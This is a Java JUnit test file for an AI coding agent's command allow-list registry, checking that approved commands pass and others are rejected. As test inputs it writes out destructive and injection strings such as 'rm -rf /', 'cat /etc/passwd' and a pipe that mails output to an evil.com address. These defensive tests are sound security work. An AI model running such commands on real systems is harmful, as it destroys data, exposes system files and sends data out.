package com.codecafe.aicodingagent.service;

import com.codecafe.aicodingagent.config.AgentProperties;
import com.codecafe.aicodingagent.exception.CommandNotApprovedException;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class ApprovedCommandRegistryTest {

    private final AgentProperties properties = new AgentProperties(
            "", 8, 60, 8000, 20000, List.of("mvn test", "npm test", "git status"));
    private final ApprovedCommandRegistry registry = new ApprovedCommandRegistry(properties);

    @Test
    void approvesExactAllowListedCommand() {
        assertThat(registry.isApproved("mvn test")).isTrue();
    }

    @Test
    void approvesAllowListedCommandWithExtraArguments() {
        assertThat(registry.isApproved("git status")).isTrue();
    }

    @Test
    void rejectsCommandNotOnAllowList() {
        assertThatThrownBy(() -> registry.validate("rm -rf /"))
                .isInstanceOf(CommandNotApprovedException.class);
    }

    @Test
    void rejectsPrefixMatchThatIsNotAWholeToken() {
        // "mvn testsomething" should NOT match the "mvn test" prefix
        assertThat(registry.isApproved("mvn testsomething")).isFalse();
    }

    @Test
    void rejectsShellMetacharacterInjectionEvenWithApprovedPrefix() {
        assertThatThrownBy(() -> registry.validate("mvn test && rm -rf /"))
                .isInstanceOf(CommandNotApprovedException.class);
        assertThatThrownBy(() -> registry.validate("mvn test; cat /etc/passwd"))
                .isInstanceOf(CommandNotApprovedException.class);
        assertThatThrownBy(() -> registry.validate("git status | mail me@evil.com"))
                .isInstanceOf(CommandNotApprovedException.class);
        assertThatThrownBy(() -> registry.validate("npm test `whoami`"))
                .isInstanceOf(CommandNotApprovedException.class);
    }

    @Test
    void rejectsBlankCommand() {
        assertThatThrownBy(() -> registry.validate("   "))
                .isInstanceOf(CommandNotApprovedException.class);
    }
}
